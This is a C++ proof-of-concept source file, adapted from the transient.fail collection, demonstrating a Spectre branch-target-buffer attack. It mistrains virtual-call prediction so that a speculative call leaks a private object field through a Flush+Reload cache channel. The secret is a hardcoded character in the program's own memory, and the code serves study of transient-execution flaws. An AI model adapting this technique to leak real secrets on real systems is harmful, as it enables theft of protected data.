/*
  Source code adapted from transient.fail
  Spectre BTB 
  Same address space, in place (sa_ip)
*/
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

extern "C" {
#include "cacheutils.h"
}

#define SECRET 'S'

// Base class
class Animal {
public:
  virtual void move() {
  }
};

// Bird contains the secret
class Bird : public Animal {
private:
  char secret;
public:
  Bird() {
    secret = SECRET;
  }
  void move() {
     // nop
  }
};

// Class that contains the function to leak data
class Fish : public Animal {
private:
  char data;
public:
  Fish() {
    data = 'F';
  }
  void move() {
    // Encode data in the cache
    cache_encode(data);
  }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal* animal) {
  animal->move();
}


int main(int argc, char **argv) {
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
 
  if(!pagesize) 
    pagesize = sysconf(_SC_PAGESIZE);
  char* _mem = (char*)malloc(pagesize*300);
  mem = (char*)(((size_t)_mem & ~(pagesize-1)) + pagesize*2);

  Fish* fish = new Fish();
  Bird* bird = new Bird(); // contains secret

  char* ptr = (char*)((((size_t)move_animal)) & ~(pagesize-1));
  mprotect(ptr, pagesize * 2, PROT_READ | PROT_WRITE | PROT_EXEC);

  memset(mem, 0, pagesize * 290);
  maccess((void*)move_animal);

  ptr[0] = ptr[0];

  printf("Works if %c appears\n", SECRET);
  while(1) {
    nospec();
    // Mistrain the BTB for Fish
    for(int j = 0; j < 1000; j++) {
      move_animal(fish);
    }
    // Flush our shared memory
    flush_shared_memory();
    mfence();

    // Increase misspeculation chance
    flush(bird);
    mfence();

    nospec();
    // Leak bird secret
    move_animal(bird);

    // Recover data from the covert channel
    for(int i = 1; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // prefetcher
      if(flush_reload(mem + mix_i * pagesize)) {
        if(mix_i == SECRET) {
          printf("%c\n", mix_i);
	  printf("Success!\n");
	  exit(0);
        }
      }
    }
  }
}
